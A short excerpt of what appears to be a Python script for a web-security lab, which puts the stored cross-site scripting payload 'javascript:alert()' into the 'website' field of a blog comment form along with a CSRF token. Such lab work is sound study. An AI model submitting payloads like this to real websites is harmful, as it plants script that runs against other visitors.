...
attack_payload = "javascript:alert()"
print(f"\"website\": {attack_payload}")
...
burp0_data = {"csrf": csrf_token, "postId": "7", "comment": "yoobi", "name": "yoobi", "email": "yoobi@yoobi.com", "website": attack_payload}
